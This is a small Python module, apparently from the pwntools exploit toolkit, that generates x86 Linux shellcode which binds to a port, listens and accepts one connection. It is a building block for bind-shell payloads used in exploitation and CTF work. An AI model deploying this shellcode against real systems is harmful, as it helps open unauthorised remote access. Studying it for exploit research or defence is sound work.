from pwn import htons

def listen(port):
    """Args: port
    Waits for a connection.  Leaves socket in EBP."""
    return """
        ;; Listens for and accepts a connection on %(portnum)d
        ;; Socket file descriptor is placed in EAX

        ;; sock = socket(AF_INET, SOCK_STREAM, 0)
        push SYS_socketcall
        pop eax
        push SYS_socketcall_socket
        pop ebx
        cdq                     ; clear EDX
        push edx                ; IPPROTO_IP (= 0)
        push ebx                ; SOCK_STREAM
        push AF_INET
        mov ecx, esp
        int 0x80

        ;; bind(sock, &addr, sizeof addr); // sizeof addr == 0x10
        push edx
        push word %(port)d
        push word AF_INET
        mov ecx, esp
        push 0x10
        push ecx
        push eax
        mov ecx, esp
        mov esi, eax
        inc ebx                 ; EBX = bind (= 2)
        mov al, byte SYS_socketcall
        int 0x80

        ;; listen(sock, whatever)
        mov al, byte SYS_socketcall
        shl ebx, 1              ; EBX = listen (= 4)
        int 0x80

        ;; accept(sock, NULL, NULL)
        push edx
        push esi                ; sock
        mov ecx, esp
        inc ebx                 ; EBX = accept (= 5)
        mov al, byte SYS_socketcall
        int 0x80

        xchg eax, ebp

        ;; close(sock)
        xchg ebx, esi
        push byte SYS_close
        pop eax
        int 0x80
""" % {'port'    : htons(int(port)),
       'portnum' : int(port)}